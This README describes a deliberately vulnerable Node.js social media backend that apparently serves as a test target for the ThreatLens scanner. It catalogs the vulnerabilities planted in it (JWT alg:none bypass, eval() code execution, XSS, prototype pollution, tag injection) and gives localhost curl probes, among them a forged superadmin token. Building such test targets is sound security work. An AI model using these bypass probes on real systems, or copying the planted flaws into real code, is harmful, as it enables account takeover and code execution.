# 🌐 04 - Vulnerable Social Media Backend (Node.js)

**Target Port**: `http://localhost:8004`  
**Security Status**: 🔴 **HIGHLY VULNERABLE (CRITICAL / HIGH RISKS)**

---

## 📋 Overview
This Node.js/Express service simulates a feed, user profile, and social interaction system with deliberate security vulnerabilities such as JWT `alg: none` signature bypass, `eval()` RCE, Prototype Pollution, and Stored/Reflected XSS.

---

## 🚨 Catalog of Injected Vulnerabilities

| Severity | Vulnerability | Endpoint / Vector | CWE / OWASP |
|---|---|---|---|
| 🔴 **CRITICAL** | **Broken JWT (`alg: none` & weak secret)** | `GET /api/auth/profile` | CWE-287 / CWE-347 |
| 🔴 **CRITICAL** | **Remote Code Execution via `eval()`** | `POST /api/feed/calculate-rank` | CWE-95 / A03:2021 |
| 🟠 **HIGH** | **Cross-Site Scripting (XSS)** | `GET /api/feed/search?q=` | CWE-79 / A03:2021 |
| 🟠 **HIGH** | **Prototype Pollution** | `POST /api/user/preferences` | CWE-1321 / A08:2021 |
| 🟡 **MEDIUM** | **Query / Tag Injection** | `GET /api/posts/filter?tag=` | CWE-89 |
| 🔵 **LOW** | **Missing Security Headers** | No CSP, No X-Frame-Options, No HSTS | CWE-693 |

---

## 🎯 ThreatLens Demo Attack Probes

### 1. JWT `alg: none` Authentication Bypass
```bash
# Forge token with header: {"alg":"none","typ":"JWT"}, payload: {"username":"admin","role":"superadmin"}
# Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ.
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InN1cGVyYWRtaW4ifQ." \
  http://localhost:8004/api/auth/profile
```

### 2. eval() Remote Code Execution Probe
```bash
curl -X POST http://localhost:8004/api/feed/calculate-rank \
  -H "Content-Type: application/json" \
  -d '{"formula": "process.version"}'
```

### 3. XSS Probe (Sectest Signature)
```bash
curl "http://localhost:8004/api/feed/search?q=%3Csectest-xss-probe%3E"
```

---

## 🚀 How to Run
```bash
cd test_backends/04_vulnerable_social_node
npm install
npm start
```
